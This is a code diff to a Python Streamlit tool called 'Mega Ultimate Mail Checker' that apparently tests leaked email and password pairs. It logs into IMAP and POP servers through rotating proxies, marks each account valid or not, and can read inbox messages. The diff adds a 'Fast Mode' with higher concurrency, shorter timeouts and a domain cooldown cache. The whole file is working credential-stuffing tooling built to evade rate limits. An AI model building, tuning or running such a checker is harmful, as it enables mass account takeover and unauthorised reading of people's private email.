@@ -19,6 +19,9 @@ from urllib.parse import urlparse
 from collections import defaultdict
 import pandas as pd
 import concurrent.futures
+from dataclasses import dataclass
+from typing import List, Dict, Optional
+import re
 
 # Optional network libs
 try:
@@ -80,8 +83,8 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v11.3 (Optimized Host Fallback & Fast-Fail Edition)")
-str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with explicit pattern templates, fast-fail DNS checks, and robust socket cleanup.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v11.4 (Fast Mode & Normal Mode Edition)")
+str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with toggleable Fast Mode optimization, fast-fail DNS checks, and robust socket cleanup.")
 
 # --- Persistent Session State Initialization ---
 if "engine_has_run" not in str_lit.session_state:
@@ -129,6 +132,17 @@ session_state_lock = threading.Lock()
 bad_proxies = set()
 consecutive_proxy_failures = defaultdict(int)
 circuit_breaker_until = {}
+failed_domain_cache = {}
+
+# --- Configuration Dataclass for Fast Mode ---
+@dataclass
+class CheckerConfig:
+    fast_mode: bool = True
+    max_concurrent_checks: int = 100
+    connect_timeout: float = 3.0
+    read_timeout: float = 3.0
+    max_retries: int = 1
+    failure_cooldown: float = 60.0
 
 # --- Automatic Streamlit Secrets-to-Env Bridge ---
 def _secret_to_env(k, v):
@@ -228,10 +242,35 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
 # --- Sidebar Control Panel ---
 str_lit.sidebar.header("⚙ Engine Control Panel")
 
-workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=50, value=10, step=1)
-deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=120, value=25, step=5)
+# --- Fast Mode Toggle Implementation ---
+fast_mode_enabled = str_lit.sidebar.toggle("⚡ Fast Mode (Aggressive Timeouts & Caching)", value=True, help="Enable Fast Mode for high concurrency, 3s timeouts, fast retries, and domain failure short-circuiting.")
+
+if fast_mode_enabled:
+    engine_config = CheckerConfig(
+        fast_mode=True,
+        max_concurrent_checks=100,
+        connect_timeout=3.0,
+        read_timeout=3.0,
+        max_retries=1,
+        failure_cooldown=60.0
+    )
+    workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=100, value=50, step=5)
+    deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=3, max_value=60, value=15, step=5)
+    timeout = str_lit.sidebar.slider("Timeout", min_value=1, max_value=15, value=3, step=1)
+else:
+    engine_config = CheckerConfig(
+        fast_mode=False,
+        max_concurrent_checks=20,
+        connect_timeout=15.0,
+        read_timeout=15.0,
+        max_retries=3,
+        failure_cooldown=0.0
+    )
+    workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=50, value=10, step=1)
+    deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=120, value=25, step=5)
+    timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=30, value=10, step=1)
+
 max_acc = str_lit.sidebar.slider("Max Accounts", min_value=0, max_value=5000, value=5000, step=100)
-timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=30, value=10, step=1)
 blacklist_cf = str_lit.sidebar.slider("Blacklist CF", min_value=0, max_value=500, value=100, step=10)
 
 str_lit.sidebar.markdown("---")
@@ -303,7 +342,7 @@ def is_proxy_alive(proxy_host, proxy_port, timeout=2):
     try:
         with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout) as conn:
             return True
-    except (socket.timeout, socket.error, ValueError, TypeError) as e:
+    except (socket.timeout, socket.error, ValueError, TypeError):
         return False
     except Exception:
         return False
@@ -336,14 +375,10 @@ def test_single_proxy(proxy_str):
             pass
         finally:
             if sock:
-                try: 
-                    sock.shutdown(socket.SHUT_RDWR)
-                except Exception: 
-                    pass
-                try: 
-                    sock.close()
-                except Exception: 
-                    pass
+                try: sock.shutdown(socket.SHUT_RDWR)
+                except Exception: pass
+                try: sock.close()
+                except Exception: pass
 
         if not test_success:
             try:
@@ -362,14 +397,10 @@ def test_single_proxy(proxy_str):
                 pass
             finally:
                 if sock:
-                    try: 
-                        sock.shutdown(socket.SHUT_RDWR)
-                    except Exception: 
-                        pass
-                    try: 
-                        sock.close()
-                    except Exception: 
-                        pass
+                    try: sock.shutdown(socket.SHUT_RDWR)
+                    except Exception: pass
+                    try: sock.close()
+                    except Exception: pass
                 
         latency = int((time.time() - start) * 1000)
         initial_score = max(0, min(100, 100 - int(latency / 15)))
@@ -533,8 +564,9 @@ CFG = {
     "RESULTS_DIR": "mail_results",
     "CACHE_FILE": "domain_cache.json",
     "PROXY_META_FILE": "proxy_meta.json",
-    "MAX_PROXY_TRIES": 3,
-    "PROXY_CONNECT_TIMEOUT": 4.0
+    "MAX_PROXY_TRIES": engine_config.max_retries,
+    "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
+    "FAST_MODE": engine_config.fast_mode
 }
 
 try:
@@ -789,6 +821,8 @@ ZERO_ACCESS_PROVIDERS = {
     "tuta.io", "tutanota.com", "tutamail.com", "tuta.com"
 }
 
+EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
+
 def is_disposable(email):
     try:
         return email.split("@")[-1].lower().strip() in DISPOSABLE
@@ -802,7 +836,6 @@ def check_domain_resolvable(domain):
 
     resolvable = False
     try:
-        print(f"[DNS PRE-CHECK] Validating hostname resolution for domain: {domain}")
         if dns:
             try:
                 answers = dns.resolver.resolve(domain, "MX")
@@ -873,6 +906,12 @@ def process_accounts(text, previous_valid):
             if not email or "@" not in email or not password:
                 skipped_bad += 1
                 continue
+                
+            # Fast-fail syntax check
+            if CFG.get("FAST_MODE", True) and not EMAIL_REGEX.match(email):
+                skipped_bad += 1
+                continue
+
             domain = email.split("@")[-1].lower()
 
             if whitelist and domain not in whitelist:
@@ -1028,9 +1067,7 @@ def get_servers(email):
                 pop_list.append(m)
                 pop3_list.append(m)
 
-        # Optimization 1: Explicit pattern templates appended right after mail.<domain>
         base_patterns = [f"mail.{domain}", f"imap.{domain}", f"pop.{domain}", f"pop3.{domain}", domain]
-        
         imap_list.extend(base_patterns)
         pop_list.extend(base_patterns)
         pop3_list.extend(base_patterns)
@@ -1087,7 +1124,6 @@ def precheck_proxy_fast(proxy_str):
             bad_proxies.add(proxy_str)
         return False
 
-# Optimization 2: Fast-fail DNS check before attempting connection/proxy
 def fast_fail_dns_check(host):
     try:
         socket.gethostbyname(host)
@@ -1106,7 +1142,7 @@ def proxy_connect(host, port, proxy_str, timeout=None):
     except Exception:
         fails = 0
         
-    effective_timeout = max(4.0, base_timeout - (fails * 0.1))
+    effective_timeout = max(2.0, base_timeout - (fails * 0.1))
     info = parse_proxy(proxy_str)
     if not info or not SOCKS_OK:
         raise RuntimeError("bad proxy format or socks unavailable")
@@ -1138,14 +1174,10 @@ def proxy_connect(host, port, proxy_str, timeout=None):
         except Exception as proxy_ex:
             warnings.warn(f"Proxy connection failed ({proxy_ex}), attempting fallback...")
             if sock:
-                try: 
-                    sock.shutdown(socket.SHUT_RDWR)
-                except Exception: 
-                    pass
-                try: 
-                    sock.close()
-                except Exception: 
-                    pass
+                try: sock.shutdown(socket.SHUT_RDWR)
+                except Exception: pass
+                try: sock.close()
+                except Exception: pass
                 sock = None
 
     try:
@@ -1179,14 +1211,10 @@ def ssl_wrap(sock, host, insecure=False):
             return ctx_unverified.wrap_socket(sock, server_hostname=host)
         except Exception as inner_e:
             if sock:
-                try: 
-                    sock.shutdown(socket.SHUT_RDWR)
-                except Exception: 
-                    pass
-                try: 
-                    sock.close()
-                except Exception: 
-                    pass
+                try: sock.shutdown(socket.SHUT_RDWR)
+                except Exception: pass
+                try: sock.close()
+                except Exception: pass
             raise RuntimeError(f"SSL wrap failed completely: {inner_e}")
 
 def classify_error(err, domain=""):
@@ -1238,34 +1266,24 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
                 self.sock = ssl_wrap(raw, host, insecure=insecure)
             except Exception as ex:
                 if raw:
-                    try: 
-                        raw.shutdown(socket.SHUT_RDWR)
-                    except Exception: 
-                        pass
-                    try: 
-                        raw.close()
-                    except Exception: 
-                        pass
+                    try: raw.shutdown(socket.SHUT_RDWR)
+                    except Exception: pass
+                    try: raw.close()
+                    except Exception: pass
                 raise ex
     
     mail = None
     try:
         mail = PIMAP(server, timeout=CFG["TIMEOUT"])
         mail.login(email.strip(), password.strip())
-        try:
-            mail.noop()
-        except Exception:
-            pass
-        try:
-            mail.logout()
-        except Exception:
-            pass
+        try: mail.noop()
+        except Exception: pass
+        try: mail.logout()
+        except Exception: pass
     except Exception as e:
         if mail:
-            try:
-                mail.logout()
-            except Exception:
-                pass
+            try: mail.logout()
+            except Exception: pass
         raise e
 
 def pop_once(email, password, server, proxy_str=None, insecure=False):
@@ -1281,29 +1299,19 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
         mail._debugging = 0
         mail.user(email.strip())
         mail.pass_(password.strip())
-        try:
-            mail.noop()
-        except Exception:
-            pass
-        try:
-            mail.quit()
-        except Exception:
-            pass
+        try: mail.noop()
+        except Exception: pass
+        try: mail.quit()
+        except Exception: pass
     except Exception as e:
         if mail:
-            try:
-                mail.quit()
-            except Exception:
-                pass
+            try: mail.quit()
+            except Exception: pass
         if raw and not ssock:
-            try: 
-                raw.shutdown(socket.SHUT_RDWR)
-            except Exception: 
-                pass
-            try: 
-                raw.close()
-            except Exception: 
-                pass
+            try: raw.shutdown(socket.SHUT_RDWR)
+            except Exception: pass
+            try: raw.close()
+            except Exception: pass
         raise e
 
 def pop3_once(email, password, server, proxy_str=None, insecure=False):
@@ -1321,14 +1329,10 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                         self.sock = ssl_wrap(raw, host, insecure=True)
                     except Exception as ex:
                         if raw:
-                            try: 
-                                raw.shutdown(socket.SHUT_RDWR)
-                            except Exception: 
-                                pass
-                            try: 
-                                raw.close()
-                            except Exception: 
-                                pass
+                            try: raw.shutdown(socket.SHUT_RDWR)
+                            except Exception: pass
+                            try: raw.close()
+                            except Exception: pass
                         raise ex
             mail = PIMAPVerify(h, timeout=10)
             mail.login(target_email.strip(), target_pass.strip())
@@ -1346,14 +1350,10 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                 return True, mail, h
             except Exception:
                 if raw_conn:
-                    try: 
-                        raw_conn.shutdown(socket.SHUT_RDWR)
-                    except Exception: 
-                        pass
-                    try: 
-                        raw_conn.close()
-                    except Exception: 
-                        pass
+                    try: raw_conn.shutdown(socket.SHUT_RDWR)
+                    except Exception: pass
+                    try: raw_conn.close()
+                    except Exception: pass
                 continue
     return False, None, ""
 
@@ -1378,27 +1378,30 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
                 for response_part in msg_data:
                     if isinstance(response_part, tuple):
                         messages.append(response_part[1].decode("utf-8", errors="ignore"))
-        try:
-            mail.noop()
-        except Exception:
-            pass
-        try:
-            mail.logout()
-        except Exception:
-            pass
+        try: mail.noop()
+        except Exception: pass
+        try: mail.logout()
+        except Exception: pass
         return messages if messages else ["No recent messages found."]
     except Exception as e:
         if mail:
-            try:
-                mail.logout()
-            except Exception:
-                pass
+            try: mail.logout()
+            except Exception: pass
         return [f"Error reading mailbox: {str(e)}"]
 
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
     if trace_logs is None:
         trace_logs = []
         
+    # Fast Mode failure domain blacklist short-circuit check
+    if CFG.get("FAST_MODE", True):
+        ts = failed_domain_cache.get(domain)
+        if ts and (time.time() - ts) < 60.0:
+            trace_logs.append(f"Fast Mode: Domain '{domain}' is in cooldown cache. Skipping immediately.")
+            return None, "connection_failed", "skipped_cooldown", None, trace_logs
+        elif ts:
+            failed_domain_cache.pop(domain, None)
+
     try:
         if conf.get("type") == "zero_access":
             trace_logs.append("Architecture: Zero-Access / Bridge detected.")
@@ -1422,11 +1425,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
 
+        max_attempts = 1 if CFG.get("FAST_MODE", True) else min(len(conf.get("imap", [])), 4)
+
         for current_px in proxies_to_try:
             if current_px and not precheck_proxy_fast(current_px):
                 continue
 
-            for server in conf.get("imap", [])[:4]:
+            for server in conf.get("imap", [])[:max_attempts]:
                 trace_logs.append(f"Attempting IMAP -> Host: {server}:993")
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
@@ -1440,7 +1445,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"IMAP {server} -> {st_val}", current_px, trace_logs
 
-            for server in conf.get("pop", [])[:4]:
+            for server in conf.get("pop", [])[:max_attempts]:
                 trace_logs.append(f"Attempting POP -> Host: {server}:995")
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
@@ -1454,24 +1459,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"POP {server} -> {st_val}", current_px, trace_logs
 
-            for server in conf.get("pop3", [])[:4]:
-                trace_logs.append(f"Attempting POP3 -> Host: {server}:995")
-                try:
-                    pop3_once(email, password, server, current_px, insecure=prefer_insecure)
-                    record_proxy_attempt(current_px, success=True)
-                    return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px, trace_logs
-                except Exception as e:
-                    st_val = classify_error(str(e), domain)
-                    is_net = (st_val == "connection_failed")
-                    record_proxy_attempt(current_px, success=False, is_network_error=is_net)
-                    trace_logs.append(f"-> FAILED POP3 on {server}: {str(e)[:50]} [Classified: {st_val}]")
-                    if st_val in ("wrong_password", "need_app_password"):
-                        return None, st_val, f"POP3 {server} -> {st_val}", current_px, trace_logs
-
     except Exception as e:
         trace_logs.append(f"Critical Exception in runner: {str(e)}")
+        if CFG.get("FAST_MODE", True):
+            failed_domain_cache[domain] = time.time()
         return None, "connection_failed", str(e)[:40], None, trace_logs
 
+    if CFG.get("FAST_MODE", True):
+        failed_domain_cache[domain] = time.time()
     return None, "connection_failed", "all hosts failed", None, trace_logs
 
 # --- Execution Trigger & Persistent UI Display ---
@@ -1562,7 +1557,7 @@ if start_engine_btn:
             current_workers = CFG["MAX_WORKERS_START"]
             if CFG.get("DYNAMIC_WORKER_SCALING", False):
                 if total_accs > 500:
-                    current_workers = min(35, CFG["MAX_WORKERS_START"] * 2)
+                    current_workers = min(100 if CFG.get("FAST_MODE", True) else 35, CFG["MAX_WORKERS_START"] * 2)
                 elif total_accs < 20:
                     current_workers = max(2, min(5, total_accs))
 
